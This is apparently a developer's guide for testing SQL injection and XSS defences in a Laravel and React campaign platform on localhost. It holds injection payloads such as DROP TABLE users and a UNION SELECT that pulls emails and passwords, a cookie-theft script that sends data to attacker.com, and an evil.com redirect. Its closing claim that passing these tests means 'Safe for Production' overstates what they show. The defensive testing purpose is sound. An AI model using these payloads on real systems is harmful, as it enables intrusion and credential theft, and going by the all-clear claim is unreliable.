# 🧪 Security Testing Guide - SQL Injection & XSS

## Quick Security Tests

### ⚡ 5-Minute Security Check

```bash
# 1. Test SQL Injection Protection
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@test.com'\'' OR 1=1--","password":"test"}'
# Expected: Login fails (not database error)

# 2. Test XSS Protection
curl -X POST http://localhost:8000/api/campaigns \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"title":"<script>alert('\''xss'\'')</script>","description":"test"}'
# Expected: Script tags removed

# 3. Verify middleware is active
php artisan route:list | grep SanitizeInput
# Expected: Shows middleware registration
```

---

## 🔍 Comprehensive Security Audit

### **Test 1: SQL Injection Attacks**

#### **A. Authentication Bypass**
```bash
# Union-based injection
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@test.com'\'' UNION SELECT 1,2,3,4,5--",
    "password": "anything"
  }'

# Expected Result: ✅ Login fails with validation error
# Bad Result: ❌ Database error or successful login
```

#### **B. Time-Based Blind SQL Injection**
```bash
curl -X POST http://localhost:8000/api/campaigns/search \
  -H "Content-Type: application/json" \
  -d '{
    "query": "test'\''; WAITFOR DELAY '\''00:00:10'\''--"
  }'

# Expected Result: ✅ Immediate response, no delay
# Bad Result: ❌ 10-second delay (SQL executed)
```

#### **C. Boolean-Based SQL Injection**
```bash
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@test.com'\'' OR 1=1--",
    "password": "x"
  }'

# Expected Result: ✅ Login fails
# Bad Result: ❌ Login succeeds
```

#### **D. Stacked Queries (Most Dangerous)**
```bash
curl -X POST http://localhost:8000/api/campaigns \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "title": "Test'\''; DROP TABLE users;--"
  }'

# Expected Result: ✅ Campaign created with sanitized title
# Bad Result: ❌ Users table dropped
```

**Verify Database Intact:**
```bash
php artisan tinker
```
```php
DB::table('users')->count();  // Should return user count
DB::table('campaigns')->count();  // Should return campaign count
exit
```

---

### **Test 2: Cross-Site Scripting (XSS)**

#### **A. Stored XSS (Most Dangerous)**

**Test in Campaign Creation:**
```json
POST /api/campaigns
{
  "title": "<script>alert('XSS')</script>",
  "description": "<img src=x onerror=\"alert('XSS')\">",
  "target_amount": 1000
}
```

**Expected:** 
- ✅ Title: `alert('XSS')` (plain text)
- ✅ No alert shows when viewing campaign

**Test in Profile Update:**
```json
PUT /api/profile
{
  "name": "<script>document.location='http://evil.com'</script>",
  "bio": "<iframe src=\"javascript:alert(1)\"></iframe>"
}
```

**Expected:**
- ✅ Script tags removed
- ✅ Name displays as plain text

#### **B. Reflected XSS**

```bash
curl "http://localhost:8000/api/search?q=<script>alert(1)</script>"
```

**Expected:** ✅ Search term sanitized in response

#### **C. DOM-Based XSS**

**Test in Frontend:**
1. Create campaign with title: `<img src=x onerror=alert(document.cookie)>`
2. View campaign details page
3. **Expected:** ✅ No alert, image not loaded

#### **D. Event Handler Injection**

```json
POST /api/campaigns
{
  "title": "Campaign <div onclick=\"alert('xss')\">Click</div>",
  "website": "javascript:alert('xss')"
}
```

**Expected:**
- ✅ onclick removed
- ✅ javascript: protocol blocked

#### **E. HTML Injection**

```json
POST /api/campaigns
{
  "description": "<object data=\"data:text/html,<script>alert(1)</script>\"></object>"
}
```

**Expected:** ✅ Object tag removed

---

### **Test 3: Input Validation**

#### **A. Email Validation**
```bash
curl -X POST http://localhost:8000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "notanemail",
    "password": "test123"
  }'

# Expected: ✅ Validation error
```

#### **B. URL Validation**
```bash
curl -X POST http://localhost:8000/api/campaigns \
  -H "Content-Type: application/json" \
  -d '{
    "website": "javascript:alert(1)"
  }'

# Expected: ✅ Validation error or protocol stripped
```

#### **C. Length Validation**
```bash
curl -X POST http://localhost:8000/api/campaigns \
  -H "Content-Type: application/json" \
  -d '{
    "title": "'$(python3 -c "print('A' * 10000)")'",
    "description": "test"
  }'

# Expected: ✅ Validation error (exceeds max length)
```

---

## 🎯 Frontend Security Tests

### **Install DOMPurify First:**
```bash
cd capstone_frontend
npm install dompurify
npm install --save-dev @types/dompurify
```

### **Test Security Utility:**

**Create test file:** `src/utils/security.test.ts`
```typescript
import { sanitizeHtml, sanitizeText, validateUrl, detectXSS } from './security';

describe('Security Utils', () => {
  test('sanitizeHtml removes scripts', () => {
    const dirty = '<script>alert("xss")</script><p>Safe content</p>';
    const clean = sanitizeHtml(dirty);
    expect(clean).not.toContain('<script>');
    expect(clean).toContain('Safe content');
  });

  test('sanitizeText removes all HTML', () => {
    const dirty = '<b>Bold</b> text with <script>alert(1)</script>';
    const clean = sanitizeText(dirty);
    expect(clean).toBe('Bold text with alert(1)');
  });

  test('validateUrl blocks javascript protocol', () => {
    const url = 'javascript:alert(1)';
    const validated = validateUrl(url);
    expect(validated).toBeNull();
  });

  test('detectXSS identifies malicious patterns', () => {
    expect(detectXSS('<script>alert(1)</script>')).toBe(true);
    expect(detectXSS('normal text')).toBe(false);
  });
});
```

**Run tests:**
```bash
npm test security.test.ts
```

---

## 🔒 Penetration Testing Scenarios

### **Scenario 1: Account Takeover via SQL Injection**

**Attack:** Try to bypass login
```bash
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "victim@test.com'\'' OR '\''1'\''='\''1",
    "password": "anything"
  }'
```

**Expected:** ✅ Login fails
**If Successful:** ❌ CRITICAL vulnerability

### **Scenario 2: Session Hijacking via XSS**

**Attack:** Steal cookies via XSS
```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**Test:** Post this in campaign description
**Expected:** ✅ Script removed, cookies safe
**If Executes:** ❌ HIGH vulnerability

### **Scenario 3: Data Exfiltration**

**Attack:** Extract database info
```sql
' UNION SELECT email, password FROM users--
```

**Test:** Use in any input field
**Expected:** ✅ Query blocked/sanitized
**If Works:** ❌ CRITICAL vulnerability

---

## ✅ Security Checklist

Use this checklist after implementing security measures:

```
Backend Protection:
☐ SQL Injection:
  ☐ No raw SQL with user input
  ☐ All queries use parameter binding
  ☐ Eloquent ORM used consistently
  ☐ MessageController fixed
  
☐ XSS Protection:
  ☐ SanitizeInput middleware registered
  ☐ Script tags removed from inputs
  ☐ Event handlers stripped
  ☐ Dangerous protocols blocked
  ☐ Blade templates use {{ }} syntax

☐ Validation:
  ☐ Email validation active
  ☐ URL validation active
  ☐ Input length limits enforced
  ☐ Type checking enabled

Frontend Protection:
☐ DOMPurify installed
☐ security.ts utility created
☐ Sanitization used in components:
  ☐ Campaign forms
  ☐ Profile updates
  ☐ Message sending
  ☐ Comments/posts
  ☐ Any user content display

Testing:
☐ SQL injection tests passed
☐ XSS tests passed
☐ Validation tests passed
☐ Normal functionality works
☐ No false positives

Deployment:
☐ Middleware enabled in Kernel.php
☐ Caches cleared
☐ Frontend built with security utils
☐ Security logs monitored
```

---

## 🚨 Red Flags to Watch For

**Signs of SQL Injection:**
- Database errors in logs
- Unexpected query results
- Slow queries after input
- Data exposure in responses

**Signs of XSS:**
- Alert boxes appearing
- Unexpected redirects
- Console errors with "unsafe"
- Cookies being accessed

**How to Monitor:**
```bash
# Watch Laravel logs
tail -f storage/logs/laravel.log | grep -i "sql\|xss\|injection"

# Check for security events
php artisan tinker
```
```php
use App\Models\ActivityLog;
ActivityLog::where('action', 'LIKE', '%security%')
  ->latest()
  ->take(10)
  ->get();
```

---

## 🎉 All Tests Passing?

If all tests pass:
- ✅ **SQL Injection: Protected**
- ✅ **XSS: Protected**
- ✅ **Validation: Active**
- ✅ **Safe for Production**

**Your platform is secure!** 🔒

Remember to:
1. Review security logs regularly
2. Keep dependencies updated
3. Perform periodic security audits
4. Monitor for new attack vectors
